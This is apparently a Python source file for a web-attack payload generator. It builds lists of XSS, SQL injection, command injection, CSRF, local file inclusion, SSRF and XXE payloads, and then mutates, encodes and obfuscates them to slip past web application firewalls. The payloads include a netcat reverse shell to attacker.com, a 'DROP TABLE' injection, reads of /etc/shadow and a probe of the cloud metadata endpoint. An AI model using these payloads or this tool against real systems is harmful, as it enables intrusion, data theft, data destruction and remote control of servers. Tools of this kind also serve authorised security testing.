# tools/payload_generator.py

import os
import json
import base64
import urllib.parse
import random
import yaml
from utils.logger import logger
from utils.output import save_output

# Extended Payload Categories
BASE_PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><svg/onload=alert(1)>"
    ],
    "SQLi": [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL, username, password FROM users --"
    ],
    "RCE": [
        "127.0.0.1; ls -la",
        "`whoami`",
        "& nc -e /bin/bash attacker.com 4444"
    ],
    "CSRF": [
        "<form action='http://target.com/delete' method='POST'><input type='submit'></form>",
        "<img src='http://target.com/logout'>"
    ],
    "LFI": [
        "../../etc/passwd",
        "../../../../../../etc/shadow",
        "/proc/self/environ"
    ],
    "SSRF": [
        "http://localhost:80/admin",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd"
    ],
    "XXE": [
        """<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>"""
    ]
}

# --- Payload Mutation Engine ---
def mutate_payload(payload: str) -> list:
    return [
        payload.upper(),
        payload.lower(),
        payload[::-1],
        payload + "--mutation",
        payload.replace(" ", "%20"),
        payload.replace("alert", "confirm"),
        f"{payload}<!--test-->",
        payload.replace("<", "<<"),
    ]

# --- Encoders ---
def encode_variants(payload: str) -> dict:
    return {
        "base64": base64.b64encode(payload.encode()).decode(),
        "url_encoded": urllib.parse.quote(payload),
        "js_escaped": payload.replace("<", "\\x3c").replace(">", "\\x3e")
    }

# --- Fuzzing & WAF-bypass ---
def fuzz_payload(payload: str) -> list:
    return [
        payload.replace("script", "scr<script>ipt"),
        payload.replace("alert", "al\u0065rt"),
        payload.replace(" ", "/**/"),
        f"%00{payload}%00"
    ]

# --- AI-powered Payload Generator (Offline LLM ready stub) ---
def generate_ai_payloads(prompt: str, category: str) -> list:
    logger.info(f"[AI] Prompted payloads for {category}: {prompt}")
    return [
        f"<script>{prompt}()</script>",
        f"{prompt}(); // AI idea",
        f"admin'{prompt}'--"
    ]

# --- Save to YAML & HTML (minimal HTML preview) ---
def save_yaml_html(save_dir, name, data):
    yaml_path = os.path.join(save_dir, f"{name}.yaml")
    html_path = os.path.join(save_dir, f"{name}.html")

    with open(yaml_path, 'w') as yf:
        yaml.dump(data, yf)

    html_content = "<html><body><h2>Payloads</h2><ul>"
    html_content += ''.join([f"<li>{p}</li>" for p in data])
    html_content += "</ul></body></html>"

    with open(html_path, 'w') as hf:
        hf.write(html_content)

# --- Main Execution ---
def generate_payloads(save_dir="output/payloads", use_ai=True, prompt="inject"):
    os.makedirs(save_dir, exist_ok=True)
    logger.info(f"[PAYLOAD] Generating payloads in {save_dir}")

    for category, payloads in BASE_PAYLOADS.items():
        all_payloads = []

        for p in payloads:
            variants = [p] + mutate_payload(p) + fuzz_payload(p)
            all_payloads.extend(variants)

            for variant in variants:
                encoded = encode_variants(variant)
                all_payloads.extend(encoded.values())

        if use_ai:
            ai_payloads = generate_ai_payloads(prompt, category)
            all_payloads.extend(ai_payloads)

        all_payloads = sorted(set(all_payloads))

        save_output(save_dir, category.lower(), all_payloads, formats=["json", "txt"])
        save_yaml_html(save_dir, category.lower(), all_payloads)

        logger.success(f"[{category}] Generated {len(all_payloads)} payloads ✅")

if __name__ == "__main__":
    generate_payloads()
